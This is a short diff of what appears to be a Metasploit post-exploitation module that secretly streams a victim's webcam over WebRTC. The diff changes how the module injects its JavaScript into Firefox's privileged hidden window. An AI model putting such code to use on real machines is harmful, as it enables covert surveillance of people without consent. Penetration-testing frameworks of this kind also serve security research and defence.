@@ -52,6 +52,7 @@ class Metasploit3 < Msf::Post
     interface = load_interface('offerer.html')
     api       = load_api_code
 
+    interface.gsub!(/\=WEBRTCAPIJS\=/, api)
     interface.gsub!(/\=SERVER\=/, server)
     interface.gsub!(/\=CHANNEL\=/, channel)
     interface.gsub!(/\=OFFERERID\=/, offerer_id)
@@ -59,8 +60,6 @@ class Metasploit3 < Msf::Post
     if datastore['TIMEOUT'] > 0
       api << "; setTimeout(function(){window.location='about:blank'}, #{datastore['TIMEOUT']*1000}); "
     end
-
-    interface.gsub!('<script src="api.js"> </script>', "<script>#{api}</script>")
 
     url = if datastore['CLOSE']
       '"about:blank"'
@@ -71,14 +70,16 @@ class Metasploit3 < Msf::Post
     %Q|
       (function(send){
         try {
+
           var AppShellService = Components
              .classes["@mozilla.org/appshell/appShellService;1"]
              .getService(Components.interfaces.nsIAppShellService);
 
           var html = "#{Rex::Text.encode_base64(interface)}";
           var url = #{url};
-          var win = AppShellService.hiddenDOMWindow.open(url, "_self", "width=500,height=500");
+          AppShellService.hiddenDOMWindow.openDialog(url, 'xxx');
           send("Streaming webcam...");
+
         } catch (e) {
           send(e);
         }
